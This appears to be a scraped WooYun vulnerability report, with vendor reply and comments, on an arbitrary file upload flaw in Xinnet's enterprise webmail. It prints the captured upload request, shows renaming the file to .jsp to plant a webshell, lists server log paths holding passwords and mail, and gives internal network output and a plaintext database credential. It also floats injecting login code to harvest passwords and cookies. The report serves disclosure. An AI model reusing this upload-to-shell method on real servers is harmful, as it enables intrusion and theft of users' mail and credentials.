{"id": 10511, "wybug_id": "wooyun-2015-0121037", "wybug_title": "新网企业邮箱服务可以shell影响（从任意用户域可拿新网服务器shell）", "wybug_corp": "新网华通信息技术有限公司", "wybug_author": "鸟云厂商", "wybug_date": "2015-06-17 11:42", "wybug_open_date": "2015-08-01 13:14", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向公众公开  简要描述： 我只想说，新网我们到底还能不能好好做朋友了？ 详细说明：  新网企业邮箱服务http://www.xinnet.com/mail/mail.html该服务可以购买，一年也就几百块钱。大量企业在用，包括新网自己家由于已经有了一个管理员账号，所以不用再去购买了。我们直接测试http://webmail.xinnet.asia/（可以是任意一个新网企业邮箱）以管理员账户登录企业信息设置---企业信纸\n\n添加新信纸---上传图片\n\n抓包\n\n\nPOST /app/eadmin/uploadStationeryPic HTTP/1.1Host: webmail.xinnet.asiaProxy-Connection: keep-aliveContent-Length: 6837Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://webmail.xinnet.asiaUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryu48IEN2y86aEeP0UDNT: 1Referer: http://webmail.xinnet.asia/app/eadmin/qyxzAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: LASTLOGINACCOUNT=x********a; zmail300_language=CN; JSESSIONID=7*******8E51------WebKitFormBoundaryu48IEN2y86aEeP0UContent-Disposition: form-data; name=\"inputfile\"; filename=\"wooyun1.jpg\"Content-Type: image/jpeg\nfilename修改为wooyun.jsp返回数据，得到路径\nHTTP/1.1 200 OKServer: nginxDate: Tue, 16 Jun 2015 16:45:01 GMTContent-Type: text/html;charset=utf-8Connection: keep-alivePragma: no-cacheExpires: Thu, 01 Jan 1970 00:00:00 GMTCache-Control: no-cacheCache-Control: no-storeContent-Length: 129{\"imgsrc\":\"/usr/zweb/forspringwork/zweb/template/stationery/img/00/xinnet.asia/temp/2015_6_17_1198739863.jsp\",\"status\":\"success\"}\n菜刀连接之\n\n此处ip不恒定，貌似是负载还是啥的查看用户的邮件发送记录（随机新网企业邮箱用户）\n/var/umail/javaapps/zmail4.0/logs/sendMail.log\n\n\n查看企业邮箱管理员操作记录（随机新网企业邮箱管理员）\n/var/umail/javaapps/zmail4.0/logs/adminAccess.log\n\n\n查看登录记录（随机新网企业邮箱用户）\n/var/umail/javaapps/zmail4.0/logs/webmail.log\n\n\n查看用户修改密码行为，不断更新，并且可以看到旧密码\n/var/umail/logs/mailgateway_operation.log\n\n\n查看用户发送的邮件内容\n/var/umail/storage/cache/20150617\ncache文件夹会有每天的邮件缓存，可以分时、分域名查看用户邮件<img src=\"/upload/201506/17021440e4a3d6842javascript:void(0)a3af2b2a4a94c5eef7978be.png\" alt=\"B492B835-CD76-441C-BA24-466B4070509A.png\" />可以修改不同企业邮箱登录口源码，可以改个代码什么的，密码往我这里发一份：）直接改企业邮箱主代码，任意用户登录后我都可以收到cookie。这里还是不演示为好= =\n/var/umail/javaapps/usr/usr/zweb/loginCustom/\n\n\nhost配置，邮件服务器\n[/var/umail/javaapps/zmail4.0/]$ cat /etc/hosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1    web1 localhost::1\t\tlocalhost6.localdomain6 localhost6121.14.68.78   pop.xinnetdns.com\n网卡信息，在内网\n[/var/umail/javaapps/zmail4.0/]$ ifconfigeth0      Link encap:Ethernet  HWaddr 00:1B:78:99:24:3A            inet addr:121.**.*.76  Bcast:121.14.3.95  Mask:255.255.255.224          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:3640668075 errors:0 dropped:92535 overruns:0 frame:0          TX packets:4068494914 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:1433004161193 (1.3 TiB)  TX bytes:3637010612570 (3.3 TiB)          Interrupt:169 Memory:f8000000-f8012800 eth1      Link encap:Ethernet  HWaddr 00:1B:78:99:24:38            inet addr:10.2.**.12  Bcast:10.2.50.63  Mask:255.255.255.192          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:7687231891 errors:4 dropped:3669985 overruns:0 frame:4          TX packets:8463979669 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:1000           RX bytes:5663583198250 (5.1 TiB)  TX bytes:7495389851878 (6.8 TiB)          Interrupt:177 Memory:fa000000-fa012800 lo        Link encap:Local Loopback            inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1          RX packets:1555579120 errors:0 dropped:0 overruns:0 frame:0          TX packets:1555579120 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0           RX bytes:3159991245155 (2.8 TiB)  TX bytes:3159991245155 (2.8 TiB)lo:0      Link encap:Local Loopback            inet addr:202.**.**.9  Mask:255.255.255.255          UP LOOPBACK RUNNING  MTU:16436  Metric:1lo:1      Link encap:Local Loopback            inet addr:123.**.**.9  Mask:255.255.255.255          UP LOOPBACK RUNNING  MTU:16436  Metric:1lo:2      Link encap:Local Loopback            inet addr:202.**.**.14  Mask:255.255.255.255          UP LOOPBACK RUNNING  MTU:16436  Metric:1lo:3      Link encap:Local Loopback            inet addr:122.13.221.71  Mask:255.255.255.255          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n找到了数据库配置文件\n<T>XDB</T><X>com.mysql.jdbc.Driverjdbc:mysql://10.2.50.60:3306/mail_account?user=umail&password=umail_password</X>\n分库太多了，几千个。具体多少用户无法估算，mysql当前用户有些语句执行不了给个示例，随便个用户id都到80000级别了，并且能返回密码md5\n\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 鸟云厂商@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-17 13:13 厂商回复： 非常感谢鸟云厂商@乌云，小新正在玩命确认及修复中 最新状态： 2015-06-18：漏洞已修复，非常感谢鸟云厂商@乌云  ", "replys": "漏洞评价：\n评论\n     2015-06-17 09:21 |    \t\tJumbo \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:29        | 猫 - http://www.chinabaiker.com)\t\t \n  新网已被轮    \n     2015-06-17 09:36 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  卧槽。。。    \n     2015-06-17 11:50 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  感觉要出很多钱 哈哈    \n     2015-06-17 12:24 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  新网：什么仇什么怨?都来轮我    \n     2015-06-17 13:00 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  感觉。。。。。一次打雷。。。下个就很普通了。。。。。    \n     2015-06-17 13:04 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  @浅蓝 哈哈 又看到你了 我昨天那个注入 还是不知道怎么办 ，也不知道算不算注入    \n     2015-06-17 14:24 |    \t\t盛大网络(乌云厂商)\t\t \n  名字起的很屌    \n     2015-06-17 15:45 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  @牛 小 帅 我用不了电脑，也没法给你看    \n     2015-06-17 15:54 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  @浅蓝 好吧 呜呜 我在论坛@你了  你帮我看看我的步骤    \n     2015-09-11 15:35 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  吊炸天    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}